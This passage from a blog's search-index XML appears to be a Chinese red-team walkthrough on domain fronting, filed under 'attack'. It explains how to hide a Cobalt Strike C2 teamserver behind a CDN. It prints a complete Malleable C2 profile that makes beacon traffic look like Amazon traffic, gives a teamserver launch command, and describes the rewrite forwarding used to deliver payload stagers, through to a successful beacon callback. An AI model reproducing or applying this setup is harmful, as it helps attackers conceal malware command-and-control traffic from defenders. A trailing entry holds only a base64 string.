        <content type="html"><![CDATA[<h1 id="Domain-Fronting"><a href="#Domain-Fronting" class="headerlink" title="Domain Fronting"></a>Domain Fronting</h1><h2 id="step1-apache-or-ngnix"><a href="#step1-apache-or-ngnix" class="headerlink" title="step1: apache or ngnix "></a>step1: apache or ngnix </h2><hr><p><strong>1:首先需要一台前置服务器，以便流量中转。然后注册一个域名，如：attack.com</strong></p><hr><p><strong>2:然后利用CDN解析域名到域前置服务器同时隐藏ip</strong></p><p>有时候修改HTTP包内的Host头字段，会将HTTP包发送给Host指向的那个域名。这就是因为这两个网站域名都是使用了同一家的CDN，而CDN就是通过判断Host头进行流量转发的。<br>很多CDN都存在这个特性。因此CDN可以匿藏你的域前置服务器的ip.</p><hr><h2 id="step2-域前置服务器的Rewrite设置"><a href="#step2-域前置服务器的Rewrite设置" class="headerlink" title="step2: 域前置服务器的Rewrite设置"></a><strong>step2: 域前置服务器的Rewrite设置</strong></h2><hr><p>域前置服务器收到cs马的stage，需要转发给teamserver，这时候需要利用rewrite进行流量的转发。</p><p>这里可以利用<a href="https://github.com/threatexpress/cs2modrewrite">脚本</a> 生成apache 的rewrite配置代码。</p><hr><h2 id="step3-C2-Server自定义流量"><a href="#step3-C2-Server自定义流量" class="headerlink" title="step3:C2 Server自定义流量"></a><strong>step3:C2 Server自定义流量</strong></h2><p>配置C2 profile以设置CS生成payload的http请求参数，我这里直接使用并修改了<a href="https://twitter.com/harmj0y">harmj0y</a> 在github上的项目<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a> 中的amazon.profile。</p><pre><code>set sleeptime &quot;5000&quot;;set jitter    &quot;0&quot;;set maxdns    &quot;255&quot;;set useragent &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;;http-get &#123;    set uri &quot;/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books&quot;;    client &#123;        header &quot;Accept&quot; &quot;*/*&quot;;        header &quot;Host&quot; &quot;www.attack.com&quot;;        metadata &#123;            base64;            prepend &quot;session-token=&quot;;            prepend &quot;skin=noskin;&quot;;            append &quot;csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;            header &quot;Cookie&quot;;        &#125;    &#125;    server &#123;        header &quot;Server&quot; &quot;Server&quot;;        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;        header &quot;Content-Encoding&quot; &quot;gzip&quot;;        output &#123;            print;        &#125;    &#125;&#125;http-post &#123;    set uri &quot;/N4215/adj/amzn.us.sr.aps&quot;;    client &#123;        header &quot;Accept&quot; &quot;*/*&quot;;        header &quot;Content-Type&quot; &quot;text/xml&quot;;        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;        header &quot;Host&quot; &quot;www.attack.com&quot;;        parameter &quot;sz&quot; &quot;160x600&quot;;        parameter &quot;oe&quot; &quot;oe=ISO-8859-1;&quot;;        id &#123;            parameter &quot;sn&quot;;        &#125;        parameter &quot;s&quot; &quot;3717&quot;;        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.attack.com&quot;;        output &#123;            base64;            print;        &#125;    &#125;    server &#123;        header &quot;Server&quot; &quot;Server&quot;;        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;        header &quot;x-ua-compatible&quot; &quot;IE=edge&quot;;        output &#123;            print;        &#125;    &#125;&#125;</code></pre><p>这里将Host修改成我们申请到的域名就行了(<a href="http://www.attack.com),启动teamserver加载profile./">www.attack.com)，启动teamserver加载profile。</a></p><p><em>./teamserver 1.1.1.1 xxxx ./c2.profile</em></p><hr><h2 id="step4-C2-server-创建监听"><a href="#step4-C2-server-创建监听" class="headerlink" title="step4:C2-server 创建监听"></a><strong>step4:C2-server 创建监听</strong></h2><p>完成之后，当目标执行payload 对你的域名 attack.com 发起 <a href="http://www.attack.com/xxxx">http://www.attack.com/xxxx</a> 请求</p><p><img src="/images/DomainFronting/listener.jpg" alt="配置监听器"></p><hr><p>此处连接的显示的ip为CDN的解析IP地址。此时域前置将请求转发到真正的C2-server，然后得到响应payload的stager。</p><p><img src="/images/DomainFronting/shell.jpg" alt="payload执行"></p><hr><p>C2-server 上线成功</p><p><img src="/images/DomainFronting/success.jpg" alt="payload执行"></p><hr><blockquote><p>Tips:记录几个坑点</p><ol><li>测试Rewrite配置是否正确启动</li><li>CDN会拦截请求，导致文件执行失败，需要设置CDN防火墙</li></ol></blockquote><hr><p>参考链接：<br><a href="https://xz.aliyun.com/t/7758">https://xz.aliyun.com/t/7758</a><br><a href="https://www.lz1y.cn/2019/03/21/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE-%E9%9A%90%E8%97%8F%E4%BD%A0%E7%9A%84C2-server/">https://www.lz1y.cn/2019/03/21/红队基础建设-隐藏你的C2-server/</a></p>]]></content>
      
      
      <categories>
          
          <category> attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码保护文件</title>
      <link href="2020/09/22/mi-ma-bao-hu-wen-jian/"/>
      <url>2020/09/22/mi-ma-bao-hu-wen-jian/</url>
      
        <content type="html"><![CDATA[<p>MjY2MTk3NTQ4Mg==</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
